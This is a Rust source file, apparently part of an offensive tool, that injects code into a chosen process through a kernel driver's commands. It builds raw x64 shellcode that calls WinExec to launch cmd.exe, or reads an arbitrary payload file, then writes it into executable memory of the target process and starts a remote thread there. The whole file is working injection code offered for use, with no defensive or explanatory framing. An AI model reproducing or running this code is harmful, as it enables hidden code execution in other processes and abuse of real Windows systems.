use windows::{
    core::s,
    Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress},
};

use crate::proc;

fn build_winexec_shellcode(winexec_addr: u64) -> Vec<u8> {
    let mut sc: Vec<u8> = Vec::with_capacity(41);
    sc.extend_from_slice(&[
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0x8D, 0x0D, 0x16, 0x00, 0x00, 0x00,
        0xBA, 0x05, 0x00, 0x00, 0x00,
        0x48, 0xB8,
    ]);
    sc.extend_from_slice(&winexec_addr.to_le_bytes());
    sc.extend_from_slice(&[
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28,
        0xC3,
    ]);
    sc.extend_from_slice(b"cmd.exe\0");
    sc
}

pub fn run(target: &str, device: &str, payload_path: Option<&str>) -> Result<(), String> {
    let pid = match target.parse::<u32>() {
        Ok(n) if n != 0 => n,
        _ => proc::find_pid(target)?,
    };
    println!("[+] Target PID ............ {pid} ({target})");

    let driver = crate::open_driver(device)?;

    driver.init_injection_ptrs()?;
    println!("[+] Injection ptrs ........ cmd 801 (RtlCreateUserThread resolved)");

    let (payload, sentinel) = match payload_path {
        Some(path) => {
            let raw = std::fs::read(path)
                .map_err(|e| format!("read {path}: {e}"))?;
            println!("[+] Payload ............... {path} ({} bytes)", raw.len());
            let s = raw.len() as u32;
            let mut buf = raw;
            buf.extend_from_slice(&[0u8; 4]);
            (buf, s)
        }
        None => {
            let winexec_addr: u64 = unsafe {
                let k32 = GetModuleHandleA(s!("kernel32.dll"))
                    .map_err(|e| format!("GetModuleHandleA(kernel32): {e}"))?;
                let p = GetProcAddress(k32, s!("WinExec"))
                    .ok_or_else(|| "GetProcAddress(WinExec) returned NULL".to_string())?;
                p as usize as u64
            };
            println!("[+] WinExec resolved ...... 0x{:016X}", winexec_addr);
            let sc = build_winexec_shellcode(winexec_addr);
            println!("[+] Shellcode built ....... {} bytes", sc.len());
            let s = sc.len() as u32;
            let mut buf = sc;
            buf.extend_from_slice(&[0u8; 4]);
            (buf, s)
        }
    };

    let status = driver.inject_rwx(pid, &payload, sentinel)?;
    let status_u = status as u32;
    println!("[+] cmd 820 returned ...... status 0x{status_u:08X}");
    println!("[+] Thread executed in PID {pid}.");
    Ok(())
}
